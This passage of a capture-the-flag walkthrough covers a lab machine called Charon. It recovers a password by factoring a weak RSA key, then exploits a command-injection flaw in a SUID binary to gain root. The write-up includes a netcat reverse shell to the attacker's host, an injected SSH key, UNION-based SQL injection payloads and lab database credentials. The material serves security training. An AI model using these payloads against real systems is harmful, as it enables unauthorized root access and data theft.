\[\phi=(p-1)(q-1)\]

Luckily for me, Python3 now has mod inverse built into the `pow` function, so this is solved by:

```

>>> p = 280651103481631199181053614640888768819
>>> q = 303441468941236417171803802700358403049
>>> d = pow(key.e, -1, (p-1)*(q-1))
>>> d
21250987814893564133283367312544315727523797355452606165102736035279600512161

```

#### Decrypt Message

I’ll need the message as an integer. In the past I’ve done some tricks with `binascii`, but Python3 now has `int.from_bytes` which works nicely.

```

>>> with open('pass.crypt', 'rb') as f:
...     ct = f.read()
...
>>> int.from_bytes(ct, byteorder='big')
69292758097292302746029287287451285971086701171702255215762623969613319049545

```

To find the plaintext, now just raise that to `d` and take the mod:

```

>>> pow(int.from_bytes(ct, 'big'), d, key.n)
3655085627790469570380129333780400348613722126708034993143159448855079795

```

I can convert that int back to bytes. I need to give it a size, and it will error if the size isn’t enough to hold the output. As the input was 32 bytes, I’ll use that:

```

>>> pow(int.from_bytes(ct, 'big'), d, key.n).to_bytes(32, 'big')
b'\x00\x02\x11\x96\xa91\xfb\x13\xd46\xba\x00nevermindthebollocks'

```

### RsaCtfTool [Alternative]

[RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) is a really handy tool for these kinds of attacked. I’ll clone it from GitHub, and run the install steps (`sudo apt install libmpc-dev libgmp3-dev sagemath` and `pip3 install -r requirements.txt`). Now I can let it attack the key and ciphertext:

```

oxdf@parrot$ /opt/RsaCtfTool/RsaCtfTool.py --publickey decoder.pub --uncipherfile pass.crypt --private

[*] Testing key decoder.pub.
[*] Performing binary_polinomial_factoring attack on decoder.pub.
[*] Performing boneh_durfee attack on decoder.pub.
[*] Performing cm_factor attack on decoder.pub.
[*] Performing comfact_cn attack on decoder.pub.
[*] Performing cube_root attack on decoder.pub.
[*] Performing ecm attack on decoder.pub.
[*] Performing ecm2 attack on decoder.pub.
[*] Performing euler attack on decoder.pub.
[*] Performing factordb attack on decoder.pub.

Results for decoder.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ==
-----END RSA PRIVATE KEY-----

Unciphered data :
HEX : 0x00021196a931fb13d436ba006e657665726d696e64746865626f6c6c6f636b73
INT (big endian) : 3655085627790469570380129333780400348613722126708034993143159448855079795
INT (little endian) : 52205716499867669216750913608236715324790992710306887276016202900746710090240
STR : b'\x00\x02\x11\x96\xa91\xfb\x13\xd46\xba\x00nevermindthebollocks'

```

The factordb attack is the one that works, and it gives the same output.

### su / SSH

That password works for both `su` from my current shell:

```

www-data@charon:/home/decoder$ su - decoder      
Password: 
decoder@charon:~$

```

And for SSH access:

```

oxdf@parrot$ sshpass -p nevermindthebollocks ssh decoder@10.10.10.31
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
23 updates are security updates.

Last login: Thu Feb 11 18:10:47 2021 from 10.10.14.8
$

```

I now have access to `user.txt`:

```

$ cat user.txt
0fab3fb7************************

```

Additionally, despite having a clean SSH terminal, I’m not able to up arrow to get previous commands. This drives me insane. There’s three things to check to turn it back on. First, I need to switch to Bash from decoder’s default shell of `sh`:

```

$ bash        
decoder@charon:~$

```

Next, the `set -o` command will show history is off. I’ll turn it back on:

```

decoder@charon:~$ set -o | grep history
history         off
decoder@charon:~$ set -o history
decoder@charon:~$ set -o | grep history
history         on

```

That solves the issue on most boxes, but this one it still doesn’t work. In the `.bashrc` file, `HISTSIZE` is set to 0:

```

decoder@charon:~$ grep HIST ~/.bashrc
HISTCONTROL=ignoreboth
# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=0
HISTFILESIZE=0

```

I’ll make it really big:

```

decoder@charon:~$ export HISTSIZE=1000000000

```

From this point on (starting with the next command), I’ll have up arrow.

## Shell as root

### Enumeration

One of my quick manual checks is to look for SUID binaries set to run as root. The very top one jumps out as unusual:

```

decoder@charon:~$ find / -perm -4000 -ls 2>/dev/null
    11731     12 -rwsr-x---   1 root     freeeze      9120 Jun 24  2017 /usr/local/bin/supershell
...[snip]...

```

If I run it, it prints the usage:

```

decoder@charon:~$ supershell 
Supershell (very beta)
usage: supershell <cmd>

```

Unfortunately, nothing I run seems to return anything:

```

decoder@charon:~$ supershell ls
Supershell (very beta)
decoder@charon:~$ supershell id
Supershell (very beta)
decoder@charon:~$ supershell pwd
Supershell (very beta)

```

### Reversing

#### ltrace

The quickest way to get a feel for what this binary is doing is to run it with `ltrace`, which will print all the library calls it’s making:

```

decoder@charon:~$ ltrace supershell id
__libc_start_main(0x40082f, 2, 0x7ffe641715d8, 0x400940 <unfinished ...>
puts("Supershell (very beta)"Supershell (very beta)
)                                                = 23
strncpy(0x7ffe641713e0, "id", 255)                                            = 0x7ffe641713e0
strcspn("id", "|`&><'"\\[]{};#")                                              = 2
strlen("id")                                                                  = 2
strncmp("id", "/bin/ls", 7)                                                   = 58
+++ exited (status 0) +++

```

It prints the banner, then copies my input (`id`, up to 255 bytes). It then calls `strcspn("id", "|``&><'"\\[]{};#")` . This returns the number of characters in the first string before reaching a common character in the string. Given the characters in the static string, I suspect this is a blacklist of not allowed characters, trying to prevent command injection. Immediately after it calls `strlen` on my input, and I can guess that if the length and the `strcspn` are different, it will exit. I can test this:

```

decoder@charon:~$ ltrace supershell "ls|ls"
__libc_start_main(0x40082f, 2, 0x7ffec3cabdd8, 0x400940 <unfinished ...>
puts("Supershell (very beta)"Supershell (very beta)
)                                                = 23
strncpy(0x7ffec3cabbe0, "ls|ls", 255)                                         = 0x7ffec3cabbe0
strcspn("ls|ls", "|`&><'"\\[]{};#")                                           = 2
strlen("ls|ls")                                                               = 5
exit(1 <no return ...>
+++ exited (status 1) +++

```

Then it compares the input to `/bin/ls`, and exits. What if I pass `/bin/ls`:

```

decoder@charon:~$ ltrace supershell /bin/ls
__libc_start_main(0x40082f, 2, 0x7ffcf5774038, 0x400940 <unfinished ...>
puts("Supershell (very beta)"Supershell (very beta)
)                                                = 23
strncpy(0x7ffcf5773e40, "/bin/ls", 255)                                       = 0x7ffcf5773e40
strcspn("/bin/ls", "|`&><'"\\[]{};#")                                         = 7
strlen("/bin/ls")                                                             = 7
strncmp("/bin/ls", "/bin/ls", 7)                                              = 0
printf("++[%s]\n", "/bin/ls"++[/bin/ls]
)                                                 = 12
setuid(0)                                                                     = -1
system("/bin/ls"decoder.pub  pass.crypt  user.txt
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                        = 0
+++ exited (status 0) +++

```

It keeps going, raising privs to root, and calling `system` on my input.

#### Ghidra

I’ll grab a copy of `supershell` using `scp`:

```

oxdf@parrot$ sshpass -p nevermindthebollocks scp decoder@10.10.10.31:/usr/local/bin/supershell .

```

I’ll open the file in [Ghidra](https://ghidra-sre.org/), analyze with the default plugins, and then jump over to the `main` function. I always like to spend a minute renaming variables to make sure I can see what it’s doing:

```

int main(int argc,long argv)

{
  int res;
  long in_FS_OFFSET;
  char input [264];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Supershell (very beta)");
  if (argc != 2) {
    puts("usage: supershell <cmd>");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  strncpy(input,*(char **)(argv + 8),0xff);
  res = tonto_chi_legge(input);
  if (res != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  res = strncmp(input,"/bin/ls",7);
  if (res == 0) {
    printf("++[%s]\n",input);
    setuid(0);
    system(input);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

So if the number of args isn’t two (program name and one more), it returns and exits, printing the usage.

Then it looks at the first argument, and passes it to `tonto_chi_legge` (name was already there, not sure where it comes from). If the result is non-zero, it exits. Then it compares the first seven characters to `/bin/ls`. If it matches, it prints, sets the priv to root, and callsed `system(input)`.

So far, I know I need to pass in one arg, and the first seven characters must be “/bin/ls”. I also need `tonto_chi_legge` to return non-zero. I’ll look at that:

```

int tonto_chi_legge(char *input)

{
  int retval;
  size_t strcspn_res;
  size_t strlen_res;
  
  if (input == (char *)0x0) {
    retval = 0;
  }
  else {
    strcspn_res = strcspn(input,"|`&><\'\"\\[]{};#");
    strlen_res = strlen(input);
    if ((long)(int)strcspn_res == strlen_res) {
      retval = 0;
    }
    else {
      retval = 1;
    }
  }
  return retval;
}

```

This is where it uses the two calls to make sure that none of the characters in the blacklist are present in the input.

### Exploit for Read

With the program figured out, I can easily list the files in `/root`:

```

decoder@charon:~$ supershell '/bin/ls -la /root'
Supershell (very beta)
++[/bin/ls -la /root]
total 28
drwx------  4 root root 4096 Feb 11 19:11 .
drwxr-xr-x 23 root root 4096 Jun 26  2017 ..
-rw-r--r--  1 root root    1 Dec 24  2017 .bash_history
drwx------  2 root root 4096 Jun 23  2017 .cache
drwxr-xr-x  2 root root 4096 Jun 27  2017 .nano
-r--------  1 root root   33 Jun 23  2017 root.txt
-rw-------  1 root root 2687 Jun 26  2017 .viminfo

```

To read a file, I need to go further. When I saw the blacklist of characters, immediately `$()` jumped out at me as not blocked. That means I can run a subshell to read the flag:

```

decoder@charon:~$ supershell '/bin/ls $(cat /root/root.txt)'
Supershell (very beta)
++[/bin/ls $(cat /root/root.txt)]
/bin/ls: cannot access 'c59a840463acc6ca14f6599721c9c18e': No such file or directory

```

When the subshell evaluates, it returns the flag value, and then it tries to run `ls c59a840463acc6ca14f6599721c9c18e`, but since that file doesn’t exist, it returns an error. Still good enough to get the flag.

It is important to put the argument for `supershell` in single quotes and not double quote. In double quotes, it will evaluate in my terminal, and then pass the results into `supershell`:

```

decoder@charon:~$ supershell "/bin/ls$(cat /root/root.txt)"
cat: /root/root.txt: Permission denied
Supershell (very beta)
++[/bin/ls]
decoder.pub  pass.crypt  user.txt

```

### Exploit for Shell

#### nc

With command execution, I can shoot for a reverse shell. The problem is that all reverse shell I know of require characters from the excluded list…except one, the old `nc -e`. Unfortunately, the `nc` on this host doesn’t have it (check `nc -h`, and there’s no `nc.traditional`). Still, I can upload it. I’ll start a Python HTTP server in `/usr/bin`, and get it:

```

decoder@charon:/dev/shm$ wget 10.10.14.8/nc.traditional
--2021-02-11 18:39:06--  http://10.10.14.8/nc.traditional
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34952 (34K) [application/octet-stream]
Saving to: ‘nc.traditional’

nc.traditional                  100%[======================================================>]  34.13K  --.-KB/s    in 0.02s

2021-02-11 18:39:06 (2.18 MB/s) - ‘nc.traditional’ saved [34952/34952]  

```

Now I can run that in the command injection and get a shell:

```

decoder@charon:/dev/shm$ supershell '/bin/ls $(/dev/shm/nc.traditional -e /bin/bash 10.10.14.8 443)'
Supershell (very beta)
++[/bin/ls $(/dev/shm/nc.traditional -e /bin/bash 10.10.14.8 443)]

```

At `nc`:

```

oxdf@parrot$ sudo nc -lnvp 443
listening on [any] 443 ...                                     
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.31] 60862
id
uid=0(root) gid=1001(freeeze) groups=1001(freeeze)

```

#### SSH

To get a better shell, I can use two commands to write an SSH key into root’s `authorized_keys` file:

```

decoder@charon:/dev/shm$ supershell '/bin/ls $(mkdir -p /root/.ssh)'
Supershell (very beta)
++[/bin/ls $(mkdir -p /root/.ssh)]

```

Now, I can’t use `>` to direct output. But I can write it to a file here, and then move it:

```

decoder@charon:/dev/shm$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys
decoder@charon:/dev/shm$ supershell '/bin/ls $(cp authorized_keys /root/.ssh/)'
Supershell (very beta)
++[/bin/ls $(cp authorized_keys /root/.ssh/)]
authorized_keys

```

Now SSH login works:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.31
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
23 updates are security updates.

Last login: Sun Dec 24 16:39:47 2017
root@charon:~# 

```

## Beyond Root

### Rabbithole SQLI

#### Show SQLI

There’s another SQL injection in the `/singlepost.php?id=` path. Posts 10, 11, and 12 exist, but if I give it `id=223`, it returns an empty post:

![image-20210211150051514](https://0xdfimages.gitlab.io/img/image-20210211150051514.png)

However, if I use `UNION` with five columns (`id=223 UNION select 1,2,3,4,5;-- -`), it works:

![image-20210211150245562](https://0xdfimages.gitlab.io/img/image-20210211150245562.png)

I can take the same approach I did above, starting by listing databases (`id=223 UNION select 1,2,3,group_concat(schema_name),5 from information_schema.schemata;-- -`):

![image-20210211150358856](https://0xdfimages.gitlab.io/img/image-20210211150358856.png)

While both could access `information_schema`, this `freeeze` table is new, and this one can’t access `supercms`. What tables does it have (`id=223 UNION select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema='freeeze';-- -`):

![image-20210211150717949](https://0xdfimages.gitlab.io/img/image-20210211150717949.png)

In that table, I can list the columns (`id=223 UNION select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_name='blog';-- -`):

![image-20210211150829946](https://0xdfimages.gitlab.io/img/image-20210211150829946.png)

The contents of this table seem to just have the posts I can see on the site (`id=223 UNION select 1,2,3,group_concat(concat(id,':',date,':',author,':',title)),5 from blog;-- -`):

![image-20210211151020125](https://0xdfimages.gitlab.io/img/image-20210211151020125.png)

#### Why Different

With a shell, I can go back and look at what actually is going on in the source. The pages for the main site (to include the blog) are in `/var/www/html/freeeze`:

```

root@charon:/var/www/html/freeeze# ls
about.html  blog.html  cmsdata  contact.html  css  fonts  images  include  index.html  js  product.html  singlepost.php

```

At the top of `singlepost.php`, it loads `include/__config.php` and then connects to the database:

```

<?php
error_reporting(E_ERROR);
include ('include/__config.php');
if(stripos($_SERVER['HTTP_USER_AGENT'],"SQLMAP") !== false)
{
 echo "Error";
 die;
}

$con=new mysqli($dbhost, $dbuser, $dbpass);
$con->select_db("freeeze");
...[snip]...

```

`$dbhost`, `$dbuser`, and `$dbpass` are defined in `__config.php`:

```

<?php
$dbuser="freeeze";
$dbpass="fr2424z";
$dbhost="localhost";
$dbname="freeeze";
?>

```

I can connect as this user myself, and verify that they only have access to the `freeeze` table:

```

root@charon:/var/www/html/freeeze# mysql -u freeeze -pfr2424z freeeze
...[snip]...
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| freeeze            |
+--------------------+
2 rows in set (0.00 sec)

```

I’ll do the same thing for the CMS side. The files are in `/var/www/html/freeeze/cmsdata`:

```

root@charon:/var/www/html/freeeze/cmsdata# ls
css  forgot.php  images  include  js  login.php  menu.php  scripts  update_page.php  upload.php

```

At the top of `forgot.php`, it does the same thing, loading from `includes/__config.php`, and then connecting to the database:

```

<?php
error_reporting(0);
$errmsg="";
if ($_SERVER['REQUEST_METHOD'] == "POST") {

        if (isset($_POST['email']))  {
                include ('include/__config.php');
                $con=new mysqli($dbhost, $dbuser, $dbpass);
                $con->select_db($dbname);
...[snip]...

```

This `__config.php` has a different user:

```

<?php
$dbuser="supercms";
$dbpass="sx2424";
$dbhost="localhost";
$ROOT_PATH="../";
$dbname="supercms";
?>

```

And as expected, this user can see a different table:

```

root@charon:/var/www/html/freeeze/cmsdata# mysql -u supercms -psx2424 supercms
...[snip]...
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| supercms           |
+--------------------+
2 rows in set (0.00 sec)

```

### Filtering

I noticed while trying to union inject that I got back just a 200 response that said “Error”. In the source, it’s a very simple filter. I thought it might be interesting to break down the function.

If the POST parameter `email` is set, it enters this part of the code, and connects to the database (otherwise it just displays the form):

```

if (isset($_POST['email']))  {
    include ('include/__config.php');
    $con=new mysqli($dbhost, $dbuser, $dbpass);
    $con->select_db($dbname);
    $user= $_POST['email'];

```

Next, it checks for the strings “UNION”, “INFORMATION\_SCHEMA”, and “union”, and returns “Error” if found:

```

    if(strpos($user,"UNION") || strpos($user,"INFORMATION_SCHEMA") || strpos($user,"union") )
    {
        echo "Error";
        die;
    }

```

The bypass was so easy because it was literally just looking for these strings. Next, it makes sure that the user has both a `@` and a `.`:

```

    if(strpos($user,"@") === false || strpos($user,".") ===false)
    {
        $errmsg ="Incorrect format";
    }

```

Now it does the DB search. If there’s no return, it sets the `$errmsg` to “Error in Database!”:

```

    else
    {
        $q="SELECT *  FROM operators WHERE email='" . $user . "'";
        $rs = $con->query($q);
        if(!$rs)
        {
            $errmsg="Error in Database!";
        }

```

Otherwise it checks if the numbers of rows is one. If so, it gets the data, and again verifies that both `@` and `.` are in the email field. If so, it sets the message to include the email:

```

        else
        {
            #echo "<br>rows: " . mysql_num_rows($rs);
            if ($rs->num_rows === 1)
            {
                $row = $rs->fetch_assoc();
                $email= $row['email'];
                if(strpos($email,"@") === false || strpos($email,".") ===false)
                    $errmsg ="Incorrect format";

                else

                    $errmsg="Email sent to: " . $row['email'] . "=>" . $row['__username_'];

            }
            else
            {
                $errmsg="User not found with that email!";
            }
        }

```